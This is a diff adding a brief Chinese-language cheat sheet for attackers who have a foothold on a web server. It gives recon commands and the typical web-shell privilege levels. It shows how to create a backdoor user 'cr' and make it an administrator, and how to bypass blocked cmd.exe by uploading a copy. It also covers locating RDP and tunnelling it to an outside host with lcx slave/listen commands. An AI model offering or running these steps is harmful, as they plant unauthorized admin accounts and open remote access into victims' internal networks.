@@ -1,0 +1,51 @@
+通常所处的权限
+
+1.ASP/php 匿名权限
+2.ASPx USER权限
+3.jsp通常使系统权限
+
+信息收集常用命令
+windows 
+ipconfig /all 查看ip
+net user 查看服务器账号
+netstat -ano 查看当前服务器端口开放情况
+ver 查看服务器操作系统
+systeminfo 查看服务器配置信息
+tasklist /svc 查看服务器进程
+taskkill -PID pid号 结束某个pid号进程
+taskkill /im qq.exe /f 结束qq进程
+net user cr cr /add 增加一个用户名cr密码cr的用户
+net localgroup administrator cr /add 将cr提升至管理员
+whoami 当前操作账户
+
+linux
+ls -al 查看当前目录下的问价和文件夹
+pwd 查看当前操作路径
+uname -a查看当前服务器内核信息
+
+cmd无法执行
+1.防护软件拦截
+2.cmd被降权
+3.组件被删除
+
+找可读写目录上传cmd.exe，
+将执行的cmd.exe路径替换成上传路径，再次调用执行。
+
+查找3389端口
+1.注册表读取
+2.工具扫描
+3.命令探针
+
+
+
+端口转发
+lcx
+网站服务器是内网ip 192.168.2.3
+外网服务器ip是 192.168.80.151
+在内网服务器上执行的lcx命令是：
+lcx.exe -slave 192.168.80.151 51 192.168.2.3 3389
+在外网服务器上执行的命令：
+lcx.exe -listen 51 3389
+
+
+
